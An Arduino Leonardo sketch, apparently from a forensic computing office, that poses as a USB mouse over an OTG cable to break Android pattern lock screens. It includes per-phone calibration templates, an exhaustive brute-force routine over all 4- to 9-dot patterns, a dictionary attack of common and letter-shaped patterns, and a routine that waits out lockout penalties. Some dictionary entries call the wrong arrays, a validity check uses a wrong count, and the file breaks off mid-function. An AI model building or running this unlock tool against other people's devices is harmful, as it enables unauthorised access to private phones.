#include <Mouse.h>
#include <MouseTo.h>
#include <Keyboard.h>

// 2018 - Sebastian Gomez - Gabinete de Pericias Informaticas - Neuquen - Argentina
// Quick reference:
// 1) Define a new mobile device profile using the templates included in this script. Copy and paste a template and add the main parameters x1,y1,c,h and h1 for the new device model.
//    Note: The h1 parameter is used when the long diagonal is bigger than 90, because relative mouse steps are limited to this scope by the Mouse.h library. The step h is done in an iterative loop until the pointer reaches h1 distance.
// 2) Look the loop() procedure, enable the validate() and test() procedures and use them to calibrate the pointer within the dots. 
// 3) Compile and upload the code to Arduino Leonardo. Start using them, connecting a mobile device to Arduino Leonardo with OTG cable while the mobile device shows the lock pattern display.
//    Note: To start the loop() procedure in Arduino Leonardo, attach a cable between Digital GND pinout (Ground) and Digital PWM pinout number 2. GND <--cable connection--> DigitalPWM-2
// 4) Modify the parameters x1,y1,c, h and h1 until they are well conditioned. Repeat 3) until they are well conditioned.
// 5) Look the loop() procedure and disable validate() and test() procedures. Enable the bruteforce() and/or dictionaryattack() procedures.
// 6) Compile and upload the code to Arduino Leonardo. Start using them, connecting a mobile device to Arduino Leonardo with OTG cable while the mobile device shows the lock pattern display.
//    Note: To start the loop() procedure in Arduino Leonardo, attach a cable between Digital GND pinout (Ground) and Digital PWM pinout number 2. GND <--cable connection--> DigitalPWM-2

// Motorola MotoX Concept Proof Template
// Dot screen locations
// 4,7 inchs
// 720 * 1280
/*  int x1 = 55; 
  int y1 = 195;
//Step to locate another absolute dot in screen
  int c = 70;
// Relative step
  int h = 80;
// Relative step to long diagonal
  int h1 = 220;
// Waiting penalty time in seconds to restart cracking
  int penaltytime = 13;
// Number of rounds failed to apply the penalty time
  int penaltyrounds = 5;
*/

// Samsung S8 VirtualBox Concept Proof Template
// Dot screen locations
// 5,5 inchs
// 1440 * 2960
  int x1 = 120;
  int y1 = 550;
  int c = 210;
  int h = 75;
  int h1 = 380;
  int penaltytime = 15;
  int penaltyrounds = 1;


//Tablet Coby Concept Proof Template
// 7 inchs
/*  int x1 = 50;
  int y1 = 165;
  int c = 30;
  int h = 90;
  int h1 = 67; //It is not used when it is lower than ´h´
  int penaltytime = 15;
  int penaltyrounds = 5;
*/

//Sony Xperia Z1 Concept Proof Template
// 5,0 inchs
// 1080 x 1920
/*  int x1 = 80;
  int y1 = 260;
  int c = 70;
  int h = 75;
  int h1 = 300;
  int penaltytime = 15;
  int penaltyrounds = 5;
*/

// Pause frame
int pause = 150; //Delay to the next pattern in milliseconds

// Define location of dots in the x and y axis
int x2 = x1 + c;
int y2 = y1;
int x3 = x1 + 2 * c;
int y3 = y1;
int x4 = x1;
int y4 = y1 + c;
int x5 = x1 + c;
int y5 = y1 + c;
int x6 = x1 + 2 * c;
int y6 = y1 + c;
int x7 = x1;
int y7 = y1 + 2 * c;
int x8 = x1 + c;
int y8 = y1 + 2 * c;
int x9 = x1 + 2 * c;
int y9 = y1 + 2 * c;

// Counter to control waiting times
int contador = 0;

// Where to begin the pattern loops
const int digit1_start = 1;
const int digit2_start = 1;
const int digit3_start = 1;
const int digit4_start = 1;
const int digit5_start = 1;
const int digit6_start = 1;
const int digit7_start = 1;
const int digit8_start = 1;
const int digit9_start = 1;

// Where to stop the pattern loops
const int digit1_stop = 9;
const int digit2_stop = 9;
const int digit3_stop = 9;
const int digit4_stop = 9;
const int digit5_stop = 9;
const int digit6_stop = 9;
const int digit7_stop = 9;
const int digit8_stop = 9;
const int digit9_stop = 9;

void loop() {
int sensorVal = digitalRead(2); //It is used to have a pause in the main loop until you attach a cable between Digital GND pinout (Ground) and Digital PWM pinout number 2. GND <--cable connection--> DigitalPWM-2
if (sensorVal == LOW) {
      MouseTo.home();
      delay(5000);
    validate(); // To calibrate ´c´ paramenter (Mouse Absolute shift)
    //test(); // To calibrate ´h´parameter (Mouse Relative shift) by connecting 3 dots
    //testshortdiagonal();
    //testlongdiagonal(); //Just use if you want to check the long diagonal moves
    //testsecuencias();
    //dictionaryattack();
    bruteforce();
   }
}

void bruteforce() {
    cracking4dots();
    cracking5dots();
    cracking6dots();
    cracking7dots(); 
    cracking8dots();
    cracking9dots();
}

void mover(int num) {
  MouseTo.home();
  switch (num) {
    case 1:
      MouseTo.setTarget(x1, y1);
      break;
    case 2:
      MouseTo.setTarget(x2, y2);
      break;
    case 3:
      MouseTo.setTarget(x3, y3);
      break;
    case 4:
      MouseTo.setTarget(x4, y4);
      break;
    case 5:
      MouseTo.setTarget(x5, y5);
      break;
    case 6:
      MouseTo.setTarget(x6, y6);
      break;
    case 7:
      MouseTo.setTarget(x7, y7);
      break;
    case 8:
      MouseTo.setTarget(x8, y8);
      break;
    case 9:
      MouseTo.setTarget(x9, y9);
      break;
  }
 while (MouseTo.move() == false) {}
    delay(pause);
    Mouse.press();
}

void setup()
{
  Mouse.begin();
  Serial.begin(9600);
  pinMode(2,INPUT_PULLUP);
  //MouseTo.setCorrectionFactor(1);
  //MouseTo.setScreenResolution(3840, 2160);
  //MouseTo.setScreenResolution(720, 1280);
}

void validate(){
for ( int walk = 1; walk <= 9; walk++ )
    {
      mover(walk);
      delay(2000);
      Mouse.release();
    }
}

void test(){
for ( int centena = 1; centena <= 9; centena++ )
   {
    for ( int decena = 1; decena <= 9; decena++ )
       {           
        for ( int unidad = 1; unidad <= 9; unidad++ )
       {    
        mover(centena);
        delay(pause);
        moverrel(centena,decena);
        delay(pause);
        moverrel(decena,unidad);
        delay(pause);
        Mouse.release();
       }
      }
  }
}

void moverrel(int origen, int destino) {
Mouse.begin();
if (origen == 1){
               if (destino == 2){
                Mouse.move(h,0);
               }
              if (destino == 4){
                Mouse.move(0,h);
               }
              if (destino == 5){
                Mouse.move(h,h);
               }
              if (destino == 6){
                Mouse.begin();
                Mouse.move(h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,h/3);
               }
              if (destino == 8){
                Mouse.begin();
                Mouse.move(h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,h/3);
               }
 }
if (origen == 2){     
               if (destino == 1){
                Mouse.move(-h,0);
              }
              if (destino == 3){
                Mouse.move(h,0);
              }
              if (destino == 4){
                Mouse.move(-h,h);
              }
              if (destino == 5){
                Mouse.move(0,h);
              }
              if (destino == 6){
                Mouse.move(h,h);
              }
              if (destino == 7){
                Mouse.begin();
                Mouse.move(-h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,h/2);
              }
              if (destino == 9){
                Mouse.begin();
                Mouse.move(h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,h/3);
              }
}
if (origen == 3){
              if (destino == 2){
                Mouse.move(-h,0);
              }
              if (destino == 4){
                Mouse.begin();
                Mouse.move(-h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,h/3);
              }
              if (destino == 5){
                Mouse.move(-h,h);
              }
              if (destino == 6){
                Mouse.move(0,h);
              }
              if (destino == 8){
                Mouse.begin();
                Mouse.move(-h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,h/2);
              }
}
if (origen == 4){
              if (destino == 1){
                Mouse.move(0,-h);
              }
              if (destino == 2){
                Mouse.move(h,-h);
              }
              if (destino == 3){
                Mouse.begin();
                Mouse.move(h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,-h/3);
              }
              if (destino == 5){
                Mouse.move(h,0);
              }
              if (destino == 7){
                Mouse.move(0,h);
              }
              if (destino == 8){
                Mouse.move(h,h);
              }
              if (destino == 9){
                Mouse.begin();
                Mouse.move(h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,h/3);
              }
}
if (origen == 5){
              if (destino == 1){
                Mouse.move(-h,-h);
              }
              if (destino == 2){
                Mouse.move(0,-h);
              }
              if (destino == 3){
                Mouse.move(h,-h);
              }
              if (destino == 4){
                Mouse.move(-h,0);
              }
              if (destino == 6){
                Mouse.move(h,0);
              }
              if (destino == 7){
                Mouse.move(-h,h);
              }
              if (destino == 8){
                Mouse.move(0,h);
              }
              if (destino == 9){
                Mouse.move(h,h);
              }
}
if (origen == 6){
              if (destino == 1){
                Mouse.begin();
                Mouse.move(-h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,-h/2);
              }
              if (destino == 2){
                Mouse.move(-h,-h);
              }
              if (destino == 3){
                Mouse.move(0,-h);
              }
              if (destino == 5){
                Mouse.move(-h,0);
              }
              if (destino == 7){
                Mouse.begin();
                Mouse.move(-h/2,h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0); 
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,h/3);
              }
              if (destino == 8){
                Mouse.move(-h,h);
              }
              if (destino == 9){
                Mouse.move(0,h);
              }
                
}
if (origen == 7){
              if (destino == 2){
                Mouse.begin();
                Mouse.move(h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,-h/3);
              }
              if (destino == 4){
                Mouse.move(0,-h);
              }
              if (destino == 5){
                Mouse.move(h,-h);
              }
              if (destino == 6){
                Mouse.begin();
                Mouse.move(h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,0);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/3,-h/2);
              }
              if (destino == 8){
                Mouse.move(h,0);
              }
}
if (origen == 8){
              if (destino == 1){
                Mouse.begin();
                Mouse.move(-h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,-h/3);              
              }
              if (destino == 3){
                Mouse.begin();
                Mouse.move(h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(h/2,-h/3);    
              }
              if (destino == 4){
                Mouse.move(-h,-h);
              }
              if (destino == 5){
                Mouse.move(0,-h);
              }
              if (destino == 6){
                Mouse.move(h,-h);
              }
              if (destino == 7){
                Mouse.move(-h,0);
              }
              if (destino == 9){
                Mouse.move(h,0);
              }
}              
if (origen == 9){
             if (destino == 2){
                Mouse.begin();
                Mouse.move(-h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(0,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,-h/2);    
              }
             if (destino == 4){
                Mouse.begin();
                Mouse.move(-h/2,-h/2);
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0); 
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/2,0); 
                delay(pause);
                Mouse.begin();
                Mouse.move(-h/3,-h/2);    
              }
             if (destino == 5){
                Mouse.move(-h,-h);
              }
             if (destino == 6){
                Mouse.move(0,-h);
              }
             if (destino == 8){
                Mouse.move(-h,0);
              }
      }
Mouse.end();
delay(pause);
}

int validPattern(int digit1, int digit2, int digit3, int digit4, int digit5, int digit6, int digit7, int digit8, int digit9, int longitud) {  
  if(longitud==4){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4)) return 1;
    else return 0;
  }

  if(longitud==5){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4) and arcovalido(digit4,digit5)) return 1;
    else return 0;
  }

  if(longitud==6){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4) and arcovalido(digit4,digit5) and arcovalido(digit5,digit6)) return 1;
    else return 0;
  }

  if(longitud==7){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4) and arcovalido(digit4,digit5) and arcovalido(digit5,digit6) and arcovalido(digit6,digit7)) return 1;
    else return 0;
  }

  if(longitud==8){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4) and arcovalido(digit4,digit5) and arcovalido(digit5,digit6) and arcovalido(digit6,digit7) and arcovalido(digit7,digit8)) return 1;
    else return 0;
  }

  if(longitud==9){
    if (arcovalido(digit1,digit2) and arcovalido(digit2,digit3) and arcovalido(digit3,digit4) and arcovalido(digit4,digit5) and arcovalido(digit5,digit6) and arcovalido(digit6,digit7) and arcovalido(digit7,digit8) and arcovalido(digit8,digit9)) return 1;
    else return 0;  
  }  
}

int arcovalido(int origen, int destino) {
  if ((origen == 1) and ((destino == 1) or (destino == 9) or (destino == 3) or (destino == 7))) return 0;
  if ((origen == 2) and ((destino == 2) or (destino == 8))) return 0;
  if ((origen == 3) and ((destino == 3) or (destino == 1) or (destino == 7) or (destino == 9))) return 0;
  if ((origen == 4) and ((destino == 4) or (destino == 6))) return 0;
  if ((origen == 5) and (destino == 5)) return 0;
  if ((origen == 6) and ((destino == 6) or (destino == 4))) return 0;
  if ((origen == 7) and ((destino == 7) or (destino == 1) or (destino == 3) or (destino == 9))) return 0;
  if ((origen == 8) and ((destino == 8) or (destino == 2))) return 0;
  if ((origen == 9) and ((destino == 9) or (destino == 1) or (destino == 3) or (destino == 7))) return 0;
  
  return 1;
  
}

int distinto(int digit1, int digit2, int digit3, int digit4, int digit5, int digit6, int digit7, int digit8, int digit9, int longitud){
  int var1 = 0;
  int var2 = 0;
  int var3 = 0;
  int var4 = 0;
  int var5 = 0;
  int var6 = 0;
  int var7 = 0;
  int var8 = 0;

  if(longitud==4){
      if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4))) var1 = 1; else var1 = 0; 
      if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4))) var2 = 1; else var2 = 0;
      if((digit3==5) or ((digit3 != digit4))) var3 = 1; else var3 = 0;
      if((var1 + var2 + var3) == 3) return 1; else return 0;
  }
  if(longitud==5){
    if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4) and (digit1 != digit5))) var1 = 1; else var1 = 0; 
    if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4) and (digit2 != digit5))) var2 = 1; else var2 = 0;
    if((digit3==5) or ((digit3 != digit4) and (digit3 != digit5))) var3 = 1; else var3 = 0;
    if((digit4==5) or ((digit4 != digit5))) var4 = 1; else var4 = 0;
    if((var1 + var2 + var3 + var4) == 5) return 1; else return 0;
  }
  
   if(longitud==6){
    if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4) and (digit1 != digit5) and (digit1 != digit6))) var1 = 1; else var1 = 0; 
    if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4) and (digit2 != digit5) and (digit2 != digit6))) var2 = 1; else var2 = 0;
    if((digit3==5) or ((digit3 != digit4) and (digit3 != digit5) and (digit3 != digit6)))  var3 = 1; else var3 = 0;
    if((digit4==5) or ((digit4 != digit5) and (digit4 != digit6))) var4 = 1; else var4 = 0;
    if((digit5==5) or ((digit5 != digit6))) var5 = 1; else var5 = 0;
    if((var1 + var2 + var3 + var4 + var5)  == 5) return 1; else return 0;  
  }      

 if(longitud==7){
    if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4) and (digit1 != digit5) and (digit1 != digit6) and (digit1 != digit7))) var1 = 1; else var1 = 0; 
    if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4) and (digit2 != digit5) and (digit2 != digit6) and (digit2 != digit7))) var2 = 1; else var2 = 0;
    if((digit3==5) or ((digit3 != digit4) and (digit3 != digit5) and (digit3 != digit6) and (digit3 != digit7))) var3 = 1; else var3 = 0;
    if((digit4==5) or ((digit4 != digit5) and (digit4 != digit6) and (digit4 != digit7))) var4 = 1; else var4 = 0;
    if((digit5==5) or ((digit5 != digit6) and (digit5 != digit7))) var5 = 1; else var5 = 0;
    if((digit6==5) or ((digit6 != digit7))) var6 = 1; else var6 = 0;
    if((var1 + var2 + var3 + var4 + var5 + var6) == 6) return 1; else return 0;  
  }

  if(longitud==8){
    if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4) and (digit1 != digit5) and (digit1 != digit6) and (digit1 != digit7) and (digit1 != digit8))) var1 = 1; else var1 = 0; 
    if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4) and (digit2 != digit5) and (digit2 != digit6) and (digit2 != digit7) and (digit2 != digit8))) var2 = 1; else var2 = 0;
    if((digit3==5) or ((digit3 != digit4) and (digit3 != digit5) and (digit3 != digit6) and (digit3 != digit7) and (digit3 != digit8))) var3 = 1; else var3 = 0;
    if((digit4==5) or ((digit4 != digit5) and (digit4 != digit6) and (digit4 != digit7) and (digit4 != digit8))) var4 = 1; else var4 = 0;
    if((digit5==5) or ((digit5 != digit6) and (digit5 != digit7) and (digit5 != digit8))) var5 = 1; else var5 = 0;
    if((digit6==5) or ((digit6 != digit7) and (digit6 != digit8))) var6 = 1; else var6 = 0;
    if((digit7==5) or ((digit7 != digit8))) var7 = 1; else var7 = 0;
    if((var1 + var2 + var3 + var4 + var5 + var6 + var7) == 7) return 1; else return 0;  
  }      
  
   if(longitud==9){
    if((digit1==5) or ((digit1 != digit2) and (digit1 != digit3) and (digit1 != digit4) and (digit1 != digit5) and (digit1 != digit6) and (digit1 != digit7) and (digit1 != digit8) and (digit1 != digit9))) var1 = 1; else var1 = 0; 
    if((digit2==5) or ((digit2 != digit3) and (digit2 != digit4) and (digit2 != digit5) and (digit2 != digit6) and (digit2 != digit7) and (digit2 != digit8) and (digit2 != digit9))) var2 = 1; else var2 = 0;
    if((digit3==5) or ((digit3 != digit4) and (digit3 != digit5) and (digit3 != digit6) and (digit3 != digit7) and (digit3 != digit8) and (digit3 != digit9))) var3 = 1; else var3 = 0;
    if((digit4==5) or ((digit4 != digit5) and (digit4 != digit6) and (digit4 != digit7) and (digit4 != digit8) and (digit4 != digit9))) var4 = 1; else var4 = 0;
    if((digit5==5) or ((digit5 != digit6) and (digit5 != digit7) and (digit5 != digit8) and (digit5 != digit9))) var5 = 1; else var5 = 0;
    if((digit6==5) or ((digit6 != digit7) and (digit6 != digit8) and (digit6 != digit9))) var6 = 1; else var6 = 0;
    if((digit7==5) or ((digit7 != digit8) and (digit7 != digit9))) var7 = 1; else var7 = 0;
    if((digit8==5) or (digit8 != digit9)) var8 = 1; else var8 = 0;
    if((var1 + var2 + var3 + var4 + var5 + var6 + var7 + var8) == 8) return 1; else return 0;  
  }      
}

void cracking4dots(){
  // Start going across all the pattern combinations
    for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
    {
      for ( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
      {
        for ( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
        {
          for ( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
          {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,0,0,0,0,0,4);
                      int test2 = distinto(digit1,digit2,digit3,digit4,0,0,0,0,0,4);
                      if ((test1==1) and (test2==1))
                      {                                             
                       int sequence[4] = {digit1,digit2,digit3,digit4};                            
                        movesequence(sequence,4);
                      }
           }
        }
      }
    }
}

void cracking5dots(){
  // Start going throuhg all the pattern combinations
    for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
    {
      for ( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
      {
        for ( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
        {
          for ( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
          {
            for ( int digit5 = digit5_start; digit5 <= digit5_stop; digit5++ )
            {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,0,0,0,0,5);
                      int test2 = distinto(digit1,digit2,digit3,digit4,digit5,0,0,0,0,5);
                      if ((test1==1) and (test2==1))
                      {               
                        int sequence[5] = {digit1,digit2,digit3,digit4,digit5};                            
                        movesequence(sequence,5);
                      }
              }
           }
        }
      }
  }
}

void cracking6dots(){
  // Start going throuhg all the pattern combinations
  for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
    {
    for ( int digit2 = digit1_start; digit2 <= digit1_stop; digit2++ )
    {
      for ( int digit3 = digit2_start; digit3 <= digit2_stop; digit3++ )
      {
        for ( int digit4 = digit3_start; digit4 <= digit3_stop; digit4++ )
        {
          for ( int digit5 = digit5_start; digit5 <= digit4_stop; digit5++ )
          {
            for ( int digit6 = digit6_start; digit6 <= digit6_stop; digit6++ )
            {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,digit6,0,0,0,6);
                      int test2 = distinto(digit1,digit2,digit3,digit4,digit5,digit6,0,0,0,6);
                      if ((test1==1) and (test2==1))
                      {               
                        int sequence[6] = {digit1,digit2,digit3,digit4,digit5,digit6};                            
                        movesequence(sequence,6);
                      }
              }
           }
        }
      }
  }
 }
}

void cracking7dots(){
  // Start going throuhg all the pattern combinations
for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
    {
  for ( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
    {
    for ( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
    {
      for ( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
      {
        for ( int digit5 = digit5_start; digit5 <= digit5_stop; digit5++ )
        {
          for ( int digit6 = digit6_start; digit6 <= digit6_stop; digit6++ )
          {
            for ( int digit7 = digit7_start; digit7 <= digit7_stop; digit7++ )
            {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,digit6,digit7,0,0,7);
                      int test2 = distinto(digit1,digit2,digit3,digit4,digit5,digit6,digit7,0,0,7);
                      if ((test1==1) and (test2==1))
                      {               
                        int sequence[7] = {digit1,digit2,digit3,digit4,digit5,digit6,digit7};                            
                        movesequence(sequence,7);
                      }
              }
           }
        }
      }
    }
   }
 }
}

void cracking8dots(){
  // Start going throuhg all the pattern combinations
for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
  {
  for ( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
    {
  for ( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
    {
    for ( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
    {
      for ( int digit5 = digit5_start; digit5 <= digit5_stop; digit5++ )
      {
        for ( int digit6 = digit6_start; digit6 <= digit6_stop; digit6++ )
        {
          for ( int digit7 = digit7_start; digit7 <= digit7_stop; digit7++ )
          {
            for ( int digit8 = digit8_start; digit8 <= digit8_stop; digit8++ )
            {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8,0,8);
                      int test2 = distinto(digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8,0,8);
                      if ((test1==1) and (test2==1))
                      {               
                        int sequence[8] = {digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8};                            
                        movesequence(sequence,8);
                      }
              }
           }
        }
      }
    }
   }
 }
}
}

void cracking9dots(){
  // Start going throuhg all the pattern combinations
for ( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
  {
 for ( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
  {
  for ( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
    {
  for ( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
    {
    for ( int digit5 = digit5_start; digit5 <= digit5_stop; digit5++ )
    {
      for ( int digit6 = digit6_start; digit6 <= digit6_stop; digit6++ )
      {
        for ( int digit7 = digit7_start; digit7 <= digit7_stop; digit7++ )
        {
          for ( int digit8 = digit8_start; digit8 <= digit8_stop; digit8++ )
          {
            for ( int digit9 = digit9_start; digit9 <= digit9_stop; digit9++ )
            {
                      int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8,digit9,9);
                      int test2 = distinto(digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8,digit9,9);
                      if ((test1==1) and (test2==1))
                      {               
                        int sequence[9] = {digit1,digit2,digit3,digit4,digit5,digit6,digit7,digit8,digit9};                            
                        movesequence(sequence,9);
                      }
              }
           }
        }
      }
    }
   }
 }
}
}
}

void waitingtime(){
                        Mouse.release();
                        delay(1000);
                        contador = contador + 1;
                        if((contador % penaltyrounds) == 0){
                          contador = 0; //Reset the counter when it reaches 5 rounds
                          Keyboard.write(KEY_RETURN);
                          Keyboard.println();
                          Keyboard.write(KEY_RETURN);
                          Keyboard.println(); 
                          for (int wait = 1; wait <= penaltytime; wait++ )
                          {
                           delay(1000);
                           Mouse.begin();
                           MouseTo.setTarget(10, y1);
                           while (MouseTo.move() == false) {}
                           Mouse.press();
                           for (int cycle = 1; cycle <= 8; cycle++ )
                              { 
                                Mouse.move(0,h);
                                delay(50);
                              }
                           Mouse.release();
                         /*  Keyboard.write(KEY_RETURN);
                           Keyboard.println();                       
                           Keyboard.write(KEY_RETURN);
                           Keyboard.println(); */
                          };
                        }
}

void movesequence(int patron[], int longitud){
int i;  
int h3 = h1;
int h4 = 0;
// This conditional tries to approach the pointer with accuracy through the long diagonal. When h1 is lower than h, it is not used. h3 y h4 are used as auxiliary variables to retain values.
delay(pause);
mover(patron[0]);
delay(pause);
if (h1 > h) {
for (i = 0; i < longitud - 1; i++){
  do
   {
    moverrel(patron[i],patron[i+1]);
    delay(pause);
    h1 = h1 - h;
    } while (h1 >= h);
    if (h1 < h) {
        h4 = h;
        h = h1;
        moverrel(patron[i],patron[i+1]);
        h = h4;
     }
     h1 = h3;
     delay(pause);
  }
  waitingtime();
}
else
{
  for (i = 0; i < longitud - 1; i++){
    moverrel(patron[i],patron[i+1]);
    delay(pause);
  }
  waitingtime();
}
}

void dictionaryattack(){
  //Top 20 most likely used patterns
  int  secuencia1[5] = {1,2,3,6,9};
  movesequence(secuencia1,5);
  int secuencia2[5] = {1,4,7,8,9}; // The letter L (big)
  movesequence(secuencia2,5);
  int secuencia3[7] = {1,2,3,5,7,8,9};
  movesequence(secuencia3,7);
  int secuencia4[4] = {1,2,3,6};
  movesequence(secuencia4,4);
  int secuencia5[4] = {1,2,5,7};
  movesequence(secuencia5,4);
  int secuencia6[5] = {3,5,7,8,9};
  movesequence(secuencia6,5);
  int secuencia7[5] = {1,2,5,8,9};
  movesequence(secuencia7,5);
  int secuencia8[4] = {4,7,8,9};
  movesequence(secuencia8,4);
  int secuencia9[5] = {1,2,3,5,7};
  movesequence(secuencia9,5);
  int secuencia10[4] = {1,4,7,8}; // The letter L (small)
  movesequence(secuencia10,4);
  int secuencia11[4] = {2,4,5,6};
  movesequence(secuencia11,4);
  int secuencia12[5] = {2,4,5,6,9};
  movesequence(secuencia12,5);
  int secuencia13[4] = {2,4,8,6};
  movesequence(secuencia13,4);
  int secuencia14[4] = {1,2,5,6};
  movesequence(secuencia14,4);
  int secuencia15[5] = {1,2,5,6,9};
  movesequence(secuencia15,5);
  int secuencia16[4] = {1,2,3,5};
  movesequence(secuencia16,4);
  int secuencia17[6] = {1,2,3,5,7,8};
  movesequence(secuencia17,6);
  int secuencia18[8] = {1,2,3,5,7,8,9,6};
  movesequence(secuencia18,8);
  int secuencia19[5] = {2,4,8,6,9};
  movesequence(secuencia19,5);
  int secuencia20[4] = {6,5,8,9};
  movesequence(secuencia10,4);

// Most frecuent pattern forming letters from the alphabet
  int secuencia21[7] = {3,2,1,4,7,8,9}; // The letter C
  movesequence(secuencia21,7);
  int secuencia22[4] = {2,5,8,9}; // The letter L (other small)
  movesequence(secuencia12,4);
  int secuencia23[7] = {7,4,1,5,3,6,9}; // The letter M
  movesequence(secuencia23,7);
  int secuencia24[7] = {7,4,1,5,9,6,3}; // The letter N
  movesequence(secuencia24,7);
  int secuencia25[8] = {1,4,7,8,9,6,3,2}; // The letter O
  movesequence(secuencia25,8);
  int secuencia26[9] = {3,2,1,4,5,6,9,8,7}; // The letter S
  movesequence(secuencia26,9);
  int secuencia27[7] = {1,4,7,8,9,6,3}; // The letter U
  movesequence(secuencia27,7);
  int secuencia28[7] = {1,2,3,5,7,8,9}; // The letter Z
  movesequence(secuencia28,7);
}

void testlongdiagonal(){
  int secuencia1[3] = {2,1,8};
  movesequence(secuencia1,3);
  int secuencia2[3] = {2,1,6};
  movesequence(secuencia2,3);
  int secuencia3[3] = {2,3,8};
  movesequence(secuencia3,3);
  int secuencia4[3] = {2,3,4};
  movesequence(secuencia4,3);
